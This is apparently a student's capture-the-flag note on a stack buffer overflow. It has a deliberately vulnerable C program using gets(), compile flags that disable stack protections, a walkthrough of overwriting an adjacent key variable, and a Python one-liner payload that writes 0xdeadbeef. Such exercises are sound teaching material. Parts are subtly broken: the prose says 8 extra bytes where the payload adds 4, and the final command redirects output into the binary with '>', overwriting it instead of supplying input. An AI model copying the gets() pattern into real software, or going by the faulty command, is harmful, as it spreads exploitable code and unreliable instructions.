```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void do_input(){
    int key = 0x12345678;
    char buffer[32];
    printf("yes? ");
    fflush(stdout);
    gets(buffer);
    if(key == 0xdeadbeef){
        printf("good job!!\n");
        printf("%04x\n", key);
        fflush(stdout);
    }
    else{
        printf("%04x\n", key);
        printf("...\n");
        fflush(stdout);
    }
}

int main(int argc, char* argv[]){
    do_input();
    return 0;
}
```

```bash
gcc prog.c -o prog -fno-stack-protector -z execstack -no-pie -m32
```

This is vulnerable to stack overwriting. The buffer is 32 bytes. This suffers from the same vulnerability as [[Simple login example]]. Even though in the code, `key` looks like it's created and put on the stack before `buffer`, in actuality, the compiler makes it so that the code will initialize `buffer` first, then `key`, then initialize `key` with the value `0x12345678`. We can actually confirm this by running it through Ghidra or any disassembler. So we can overflow this by inputing 32 characters + 8 bytes: `0xdeadbeef`. This is a little endian program so we'd have to input the bytes as little-endian `\xef\xbe\xad\xde`.

We can create a python script for this (have to import `sys`, a bit clunky but it's cuz of how `python3` handles byte strings):

```python
python -c 'import sys; sys.stdout.buffer.write(b"A" * 32 + b"\xef\xbe\xad\xde")' > ./prog
```